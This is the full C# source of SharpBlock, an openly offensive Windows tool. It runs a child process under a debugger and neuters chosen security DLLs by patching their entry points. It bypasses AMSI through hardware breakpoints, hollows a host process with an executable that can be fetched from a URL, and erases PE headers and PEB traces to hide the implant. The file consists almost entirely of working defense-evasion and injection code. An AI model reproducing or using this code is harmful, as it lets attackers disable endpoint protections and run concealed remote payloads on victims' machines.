using Mono.Options;
using SharpSploit.Execution.ManualMap;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SharpSploit.Execution;
using static SharpBlock.WinAPI;
using Execute = SharpSploit.Execution;
using static SharpBlock.PE;
using System.IO.Pipes;
using SharpSploit.Execution.Injection;
using System.Net;

namespace SharpBlock {

    class Program {

        public struct HostProcessInfo {
            public IntPtr newLoadAddress;
            public IntPtr newEntryPoint;
            public IntPtr peb;
            public IntPtr previousLoadAddress;
            public IntPtr previousEntryPoint;
        }

        static List<string> blockDllName = new List<string>();
        static List<string> blockDescription = new List<string>();
        static List<string> blockCopyright = new List<string>();
        static List<string> blockProduct = new List<string>();

        static IntPtr amsiInitalizePtr;

        private static IntPtr GetIntPtrFromByteArray(byte[] byteArray) {
            GCHandle pinnedArray = GCHandle.Alloc(byteArray, GCHandleType.Pinned);
            IntPtr intPtr = pinnedArray.AddrOfPinnedObject();
            pinnedArray.Free();
            return intPtr;
        }

        private static bool ShouldBlockDLL(string dllPath) {

            // Get the file version for the notepad.
            FileVersionInfo dllVersionInfo = FileVersionInfo.GetVersionInfo(dllPath);
            string dllName = Path.GetFileName(dllPath);

            if (blockDllName.Contains(dllName))
                return true;

            if (dllVersionInfo.FileDescription != null && blockDescription.Contains(dllVersionInfo.FileDescription))
                return true;

            if (dllVersionInfo.ProductName != null && blockProduct.Contains(dllVersionInfo.ProductName))
                return true;

            if (dllVersionInfo.LegalCopyright != null && blockCopyright.Contains(dllVersionInfo.LegalCopyright))
                return true;

            return false;
        }

        static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {

            long fileSize;
            StringBuilder dllPath = new StringBuilder(1024);

            if (!WinAPI.GetFileSizeEx(moduleHandle, out fileSize) || fileSize == 0) {
                return null;
            }

            IntPtr handle = WinAPI.CreateFileMapping(moduleHandle, IntPtr.Zero,
                WinAPI.FileMapProtection.PageReadonly | WinAPI.FileMapProtection.SectionImage, 0, 0, null);

            if (handle == IntPtr.Zero) {
                return null;
            }

            IntPtr mem = WinAPI.MapViewOfFile(handle, WinAPI.FileMapAccess.FileMapRead, 0, 0, UIntPtr.Zero);

            if (mem == IntPtr.Zero) {
                return null;
            }

            if (WinAPI.GetFinalPathNameByHandle(moduleHandle, dllPath, (uint)dllPath.Capacity, 0) == 0) {
                return null;
            }

            dllPath = dllPath.Replace("\\\\?\\", "");

            PE.IMAGE_DOS_HEADER dosHeader = (PE.IMAGE_DOS_HEADER)Marshal.PtrToStructure(mem, typeof(PE.IMAGE_DOS_HEADER));
            PE.IMAGE_FILE_HEADER fileHeader = (PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(mem.ToInt64() + dosHeader.e_lfanew), typeof(PE.IMAGE_FILE_HEADER));

            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            IntPtr entryPoint;
            if ((fileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) == IMAGE_FILE_32BIT_MACHINE) {
                PE.IMAGE_OPTIONAL_HEADER32 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER32));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt32());

            } else {
                PE.IMAGE_OPTIONAL_HEADER64 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER64));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt64());
            }

            if (ShouldBlockDLL(dllPath.ToString())) {

                Console.WriteLine($"[+] Blocked DLL {dllPath}");

                byte[] retIns = new byte[1] { 0xC3 };
                IntPtr bytesWritten;

                Console.WriteLine("[+] Patching DLL Entry Point at 0x{0:x}", entryPoint.ToInt64());

                if (WinAPI.WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
                    Console.WriteLine("[+] Successfully patched DLL Entry Point");
                } else {
                    Console.WriteLine("[!] Failed patched DLL Entry Point");
                }
            }

            return dllPath.ToString();
        }

        static void DisableAMSI(IntPtr hThread, IntPtr hProcess) {

            Context64 ctx = new Context64(ContextFlags.All);
            ctx.GetContext(hThread);

            //Reads the memory for the current stack pointer to get the return address
            ctx.Ip = ctx.GetCurrentReturnAddress(hProcess);
            //Restore the stack pointer to the prior state before AmsiInitalize was called
            ctx.PopStackPointer();
            //Set the return value register to indicate AMSI is disabled
            ctx.SetResultRegister(0x80070002);

            ctx.SetContext(hThread);
        }

        static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address) {

            Context64 ctx = new Context64(ContextFlags.Debug);
            ctx.GetContext(hThread);

            if (ctx.Ip != (ulong)address.ToInt64()) {
                ctx.EnableBreakpoint(address);
            } else {
                // If our BP address matches the thread context address
                // then we have hit the HBP, so we need to disable
                // DR0 and enabled single step so that we break at the
                // next instruction and re-eable the HBP.
                ctx.EnableSingleStep();
            }

            ctx.SetContext(hThread);
        }

        static void ClearHardwareBreakpoints(IEnumerable<IntPtr> handles) {
            foreach (IntPtr thread in handles) {
                Context64 ctx = new Context64(ContextFlags.Debug);
                ctx.GetContext(thread);
                ctx.ClearBreakpoint();
                ctx.SetContext(thread);
            }
        }

        static void EnableHardwareBreakpoints(IEnumerable<IntPtr> handles, IntPtr address) {
            foreach (IntPtr thread in handles) {
                Context64 ctx = new Context64(ContextFlags.Debug);
                ctx.GetContext(thread);
                ctx.EnableBreakpoint(address);
            }
        }

        static IntPtr MapExecutableMemory(byte[] pe, IntPtr hProcess, out IntPtr pRemoteImage) {

            IntPtr pModule = Map.AllocateBytesToMemory(pe);
            Execute.PE.PE_META_DATA PEINFO = Execute.DynamicInvoke.Generic.GetPeMetaData(pModule);

            // Check module matches the process architecture
            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4)) {
                Marshal.FreeHGlobal(pModule);
                throw new InvalidOperationException("The module architecture does not match the process architecture.");
            }

            // Alloc PE image memory -> RW
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
            IntPtr pImage = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(
                (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
                Execute.Win32.WinNT.PAGE_READWRITE
            );

            IntPtr RemoteBaseAddress = new IntPtr((long)(PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase));
            pRemoteImage = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(
                hProcess, ref RemoteBaseAddress, IntPtr.Zero, ref RegionSize,
                Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
                Execute.Win32.WinNT.PAGE_READWRITE
            );

            // Write PE header to memory
            UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
            UInt32 BytesWritten = Execute.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);

            foreach (Execute.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections) {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);

                // Write data
                BytesWritten = Execute.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                if (BytesWritten != ish.SizeOfRawData) {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            //If allocated remote image base doesn't match PE header, process relocation table
            if (pRemoteImage != new IntPtr((long)(PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase))) {
                Map.RelocateModule(PEINFO, pImage, pRemoteImage);
            }
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, pRemoteImage, pImage, (uint)RegionSize.ToInt32());

            foreach (Execute.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections) {

                IntPtr sectionAddress = new IntPtr(pRemoteImage.ToInt64() + ish.VirtualAddress);
                IntPtr sectionSize = new IntPtr(ish.VirtualSize);

                if (ish.Characteristics.HasFlag(Execute.PE.DataSectionFlags.MEM_EXECUTE)) {
                    if (ish.Characteristics.HasFlag(Execute.PE.DataSectionFlags.MEM_WRITE)) {
                        Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x40);
                    } else {
                        Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x20);
                    }                
                }else if (ish.Characteristics.HasFlag(Execute.PE.DataSectionFlags.MEM_WRITE)) {
                    Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x4);
                } else {
                    Execute.DynamicInvoke.Native.NtProtectVirtualMemory(hProcess, ref sectionAddress, ref sectionSize, 0x2);
                }
            }

            return new IntPtr(pRemoteImage.ToInt64() + (PEINFO.Is32Bit ? PEINFO.OptHeader32.AddressOfEntryPoint : PEINFO.OptHeader64.AddressOfEntryPoint));
        }

        static byte[] LoadProcessFromPipe(string path) {

            int amountRead = 0;
            byte[] buffer = new byte[65536];
            MemoryStream processDataStream = new MemoryStream();
            string pipeName = path.Substring(9);
            var npss = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte);

            Console.WriteLine($"[+] Waiting for process data from pipe {pipeName}");
            npss.WaitForConnection();

            while ((amountRead = npss.Read(buffer, 0, buffer.Length)) > 0) {
                processDataStream.Write(buffer, 0, amountRead);
            };

            npss.Disconnect();
            return processDataStream.ToArray();      
        }


        static byte[] LoadProcessFromWeb(string url) {
            WebClient client = new WebClient();
            client.Credentials = CredentialCache.DefaultCredentials; 
            client.Proxy = WebRequest.GetSystemWebProxy();
            return client.DownloadData(url);  
        }

        static byte[] LoadProcessData(string path) {

            byte[] data;

            if (path.StartsWith(@"\\.\pipe\")) {
                data = LoadProcessFromPipe(path);  
            }else if(path.StartsWith("http://") || path.StartsWith("https://")) {
                data = LoadProcessFromWeb(path);
            } else {
                data = File.ReadAllBytes(path);                
            }

            if(data == null || data.Length == 0) {
                throw new Exception($"Failed to download executable from {path}");
            }

            return data;
        }

        static IntPtr ReadPointer (IntPtr hProcess, IntPtr address) {
            uint bytesRead = (uint)IntPtr.Size;
            IntPtr buffer = Marshal.AllocHGlobal(IntPtr.Size);
            Execute.DynamicInvoke.Native.NtReadVirtualMemory(hProcess, address, buffer, ref bytesRead);            
            IntPtr result = Marshal.ReadIntPtr(buffer);
            Marshal.FreeHGlobal(buffer);
            return result;
        }

        static void WritePointer(IntPtr hProcess, IntPtr address, IntPtr value) {
            uint size = (uint)IntPtr.Size;
            IntPtr buffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(buffer, value);
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, address, buffer, size);
            Marshal.FreeHGlobal(buffer);
        }

        static T ReadType<T>(IntPtr hProcess, IntPtr address) where T : new() {
            uint size = (uint)Marshal.SizeOf(typeof(T));
            IntPtr objectData = Marshal.AllocHGlobal((int)size);
            Execute.DynamicInvoke.Native.NtReadVirtualMemory(hProcess, address, objectData, ref size);
            T result = (T)Marshal.PtrToStructure(objectData,typeof(T));
            Marshal.FreeHGlobal(objectData);
            return result;
        }

        static void WriteType<T>(IntPtr hProcess, IntPtr address, T type) where T : new() {
            uint size = (uint)Marshal.SizeOf(typeof(T));
            IntPtr objectData = Marshal.AllocHGlobal((int)size);
            Marshal.StructureToPtr(type, objectData, false);
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, address, objectData, size);  
            Marshal.FreeHGlobal(objectData);
        }

        static void ClearMemory(IntPtr hProcess, IntPtr address, int size) {
            byte[] data = new byte[size];
            IntPtr emptyMem = Marshal.AllocHGlobal(size);
            Marshal.Copy(data, 0, emptyMem, size);
            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, address, emptyMem, (uint)size);            
            Marshal.FreeHGlobal(emptyMem);
        }

        static bool IsHostPEGUIApp(string path) {    
            Execute.PE pe =  SharpSploit.Execution.PE.Load(File.ReadAllBytes(path));
            return pe.OptionalHeader64.Subsystem == 2;
        }

        static void HideHollowedProcess(IntPtr hProcess, HostProcessInfo hpi) {

            //Pull out the current image headers
            IMAGE_DOS_HEADER dosHeader = ReadType<IMAGE_DOS_HEADER>(hProcess, hpi.newLoadAddress);
            IMAGE_FILE_HEADER fileHeader = ReadType<IMAGE_FILE_HEADER>(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + dosHeader.e_lfanew));
            IMAGE_OPTIONAL_HEADER64 optionalHeader = ReadType<IMAGE_OPTIONAL_HEADER64>(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + dosHeader.e_lfanew +
                Marshal.SizeOf(typeof(IMAGE_FILE_HEADER))));
           
            //Clear some key areas used to spot PE files in memory
            ClearMemory(hProcess, hpi.newLoadAddress, 3);
            ClearMemory(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + 0x40) , (int)dosHeader.e_lfanew - 0x40);
            ClearMemory(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + (int)dosHeader.e_lfanew), Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)));

            //Clear out section names and characteristics used to identify implanted PE files
            for (int section = 0; section < fileHeader.NumberOfSections; section++) {
                IntPtr sectionOffset = new IntPtr(hpi.newLoadAddress.ToInt64() + 
                                                (int)dosHeader.e_lfanew + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) +
                                                fileHeader.SizeOfOptionalHeader + 
                                                (Marshal.SizeOf(typeof(Execute.PE.IMAGE_SECTION_HEADER)) * section));

                Execute.PE.IMAGE_SECTION_HEADER ish = ReadType<Execute.PE.IMAGE_SECTION_HEADER>(hProcess, sectionOffset);
                ish.Name = new char[8];
                ish.Characteristics = 0;
                WriteType<Execute.PE.IMAGE_SECTION_HEADER>(hProcess, sectionOffset, ish);
            }

            //Replace base address in PEB with the original
            WritePointer(hProcess, new IntPtr(hpi.peb.ToInt64() + 0x10), hpi.previousLoadAddress);

            //Finally replace main module load address and entrypoint with original host process
            IntPtr pebLdrDataPtr = ReadPointer(hProcess, new IntPtr(hpi.peb.ToInt64() + 0x18));
            PEB_LDR_DATA pebLdrData = ReadType<PEB_LDR_DATA>(hProcess, pebLdrDataPtr);
            LDR_DATA_TABLE_ENTRY mainModule = ReadType<LDR_DATA_TABLE_ENTRY>(hProcess, pebLdrData.InLoadOrderModuleListPtr.Flink);
            mainModule.DllBase = hpi.previousLoadAddress;
            mainModule.EntryPoint = hpi.previousEntryPoint;
            WriteType(hProcess, pebLdrData.InLoadOrderModuleListPtr.Flink, mainModule);
        }

        static HostProcessInfo ReplaceExecutable(IntPtr hProcess, IntPtr hThread, string path) {

            //Map our executable into memory from the choosen source (file, web, pipe)
            HostProcessInfo hpi = new HostProcessInfo();
            IntPtr remoteImage;
            IntPtr entryPoint = MapExecutableMemory(LoadProcessData(path), hProcess, out remoteImage);
                   
            //Get the thread context of our newly launched host process
            Context64 ctx = new Context64(ContextFlags.All);
            ctx.GetContext(hThread);            
            long peb = ctx.GetRegister(3);

            //Fill in some key information we need for later
            hpi.previousEntryPoint = new IntPtr(ctx.GetRegister(2));
            hpi.newEntryPoint = entryPoint;
            hpi.newLoadAddress = remoteImage;
            hpi.peb = new IntPtr(peb);
            hpi.previousLoadAddress = ReadPointer(hProcess, new IntPtr(peb + 0x10));
            
            Console.WriteLine($"[+] PEB Address: 0x{peb:x16}");
            Console.WriteLine($"[+] Existing entry point: 0x{hpi.previousEntryPoint.ToInt64():x16}");
            Console.WriteLine($"[+] New entry point: 0x{entryPoint.ToInt64():x16}");
            Console.WriteLine($"[+] Existing base: 0x{hpi.previousLoadAddress.ToInt64():x16}");
            Console.WriteLine($"[+] New base: 0x{remoteImage.ToInt64():x16}");

            //Set RCX to the updated entry point of our new in memory PE
            ctx.SetRegister(2, entryPoint.ToInt64());
            ctx.SetContext(hThread);

            //Write our new base address within PEB
            WritePointer(hProcess, new IntPtr(peb + 0x10), remoteImage);
                       
            return hpi;
        }        

        static void Main(string[] args) {

            string program = "c:\\windows\\system32\\cmd.exe";
            string hostProcess = null;
            string programArgs = "";
            bool showHelp = false;
            bool bypass = false;
            HostProcessInfo hpi = new HostProcessInfo();

            Console.WriteLine(
                 "SharpBlock by @_EthicalChaos_\n" +
                 $"  DLL Blocking app for child processes { (IntPtr.Size == 8 ? "x86_64" : "x86")} \n"
                );

            OptionSet option_set = new OptionSet()
                .Add("e=|exe=", "Program to execute (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add("n=|name=", "Name of DLL to block", v => blockDllName.Add(v))
                .Add("c=|copyright=", "Copyright string to block", v => blockCopyright.Add(v))
                .Add("p=|product=", "Product string to block", v => blockProduct.Add(v))
                .Add("d=|description=", "Description string to block", v => blockDescription.Add(v))
                .Add("b=|bypass=", "Bypasses AMSI within the executed process (true|false)", v => bypass = v != null)
                .Add("s=|spawn=", "Host process to spawn for swapping with the target exe", v => hostProcess = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            try {

                IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
                amsiInitalizePtr = WinAPI.GetProcAddress(amsiBase, "AmsiInitialize");

                Console.WriteLine($"[+] in-proc AMSI 0x{amsiBase.ToInt64():x16}");

                IntPtr stdOut;
                IntPtr stdErr;
                IntPtr stdIn;
                IntPtr currentProcess = new IntPtr(-1);
                
                WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_OUTPUT_HANDLE), currentProcess, out stdOut, 0, true, 2);
                WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_ERROR_HANDLE), currentProcess, out stdErr, 0, true, 2);
                WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_INPUT_HANDLE), currentProcess, out stdIn, 0, true, 2);

                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
                startupInfo.dwFlags = 0x00000101;
                startupInfo.hStdOutput = stdOut;
                startupInfo.hStdError = stdErr;
                startupInfo.hStdInput = stdIn;

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                if (!CreateProcess(hostProcess != null ? hostProcess : program, $"\"{hostProcess}\" {programArgs}", IntPtr.Zero, IntPtr.Zero, true, WinAPI.DEBUG_PROCESS, IntPtr.Zero, null,
                    ref startupInfo, out pi)) {
                    Console.WriteLine($"[!] Failed to create process { (hostProcess != null ? hostProcess : program) } with error {Marshal.GetLastWin32Error()}");
                    return;
                }

                Console.WriteLine($"[+] Launched process { (hostProcess != null ? hostProcess : program)} with PID {pi.dwProcessId}");

                bool bContinueDebugging = true;
                Dictionary<uint, IntPtr> processHandles = new Dictionary<uint, IntPtr>();
                Dictionary<uint, IntPtr> threadHandles = new Dictionary<uint, IntPtr>();

                while (bContinueDebugging) {
                    IntPtr debugEventPtr = Marshal.AllocHGlobal(1024);
                    bool bb = WinAPI.WaitForDebugEvent(debugEventPtr, 1000);
                    UInt32 dwContinueDebugEvent = WinAPI.DBG_CONTINUE;
                    if (bb) {
                        WinAPI.DEBUG_EVENT DebugEvent = (WinAPI.DEBUG_EVENT)Marshal.PtrToStructure(debugEventPtr, typeof(WinAPI.DEBUG_EVENT));
                        IntPtr debugInfoPtr = GetIntPtrFromByteArray(DebugEvent.u);
                        switch (DebugEvent.dwDebugEventCode) {

                            /* Uncomment if you want to set OutputDebugString output
                            case WinAPI.OUTPUT_DEBUG_STRING_EVENT:
                                WinAPI.OUTPUT_DEBUG_STRING_INFO OutputDebugStringEventInfo = (WinAPI.OUTPUT_DEBUG_STRING_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.OUTPUT_DEBUG_STRING_INFO));
                                IntPtr bytesRead;
                                byte[] strData = new byte[OutputDebugStringEventInfo.nDebugStringLength];
                                WinAPI.ReadProcessMemory(pi.hProcess, OutputDebugStringEventInfo.lpDebugStringData, strData, strData.Length, out bytesRead);
                                Console.WriteLine(Encoding.ASCII.GetString(strData));
                                break;
                            */

                            case WinAPI.CREATE_PROCESS_DEBUG_EVENT:

                                WinAPI.CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfo = (WinAPI.CREATE_PROCESS_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_PROCESS_DEBUG_INFO));
                                processHandles[DebugEvent.dwProcessId] = CreateProcessDebugInfo.hProcess;
                                threadHandles[DebugEvent.dwThreadId] = CreateProcessDebugInfo.hThread;

                                if (bypass)
                                    SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr);

                                break;
                            case WinAPI.CREATE_THREAD_DEBUG_EVENT:
                                WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = (WinAPI.CREATE_THREAD_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_THREAD_DEBUG_INFO));
                                threadHandles[DebugEvent.dwThreadId] = CreateThreadDebugInfo.hThread;

                                if (bypass)
                                    SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, amsiInitalizePtr);

                                break;
                            case WinAPI.EXIT_PROCESS_DEBUG_EVENT:
                                if (pi.dwProcessId == DebugEvent.dwProcessId) {
                                    bContinueDebugging = false;
                                }
                                break;
                            case WinAPI.LOAD_DLL_DEBUG_EVENT:
                                WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = (WinAPI.LOAD_DLL_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.LOAD_DLL_DEBUG_INFO));
                                string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);

                                if (DebugEvent.dwProcessId == pi.dwProcessId && hostProcess != null && dllPath.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase)) {
                                    Console.WriteLine($"[+] Replacing host process with {program}");
                                    hpi = ReplaceExecutable(processHandles[DebugEvent.dwProcessId], threadHandles[DebugEvent.dwThreadId], program);

                                    //Once we have hollowed out our process we put a breakpoint on 
                                    //our in-memory PE entry point.  
                                    //Once the entry point is hit it means that we can then attempt to 
                                    //hide our PE from prying eyes.
                                    SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], hpi.newEntryPoint);
                                }

                                break;
                            case WinAPI.EXCEPTION_DEBUG_EVENT:
                                WinAPI.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = (WinAPI.EXCEPTION_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.EXCEPTION_DEBUG_INFO));

                                if (ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP) {

                                    //Check to see if the single step breakpoint is at AmsiInitalize
                                    if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == amsiInitalizePtr) {
                                        //It is, to update the thread context to return to caller with 
                                        //an invalid result
                                        DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
                                        //Opsec purposes, lets now clear all threads of hardware breakpoints
                                        ClearHardwareBreakpoints(threadHandles.Values.ToArray());

                                        //check to see if we have hit our in-memory PE entry-point
                                    } else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == hpi.newEntryPoint) {

                                        HideHollowedProcess(pi.hProcess, hpi);

                                        Context64 ctx = new Context64(ContextFlags.Debug);
                                        ctx.ClearBreakpoint();
                                        ctx.SetContext(threadHandles[DebugEvent.dwThreadId]);
                                    }

                                } else {
                                    dwContinueDebugEvent = WinAPI.DBG_EXCEPTION_NOT_HANDLED;
                                }

                                break;
                        }

                        WinAPI.ContinueDebugEvent((uint)DebugEvent.dwProcessId,
                            (uint)DebugEvent.dwThreadId,
                            dwContinueDebugEvent);
                    }
                    if (debugEventPtr != null)
                        Marshal.FreeHGlobal(debugEventPtr);
                }

                int exitCode;
                WinAPI.GetExitCodeProcess(pi.hProcess, out exitCode);
                Console.WriteLine($"[+] Process {program} with PID {pi.dwProcessId} exited wit code {exitCode:x}");

            }catch(Exception e) {
                Console.WriteLine($"[!] SharpBlock failed with error {e.Message}");
            }
        }
    }
}
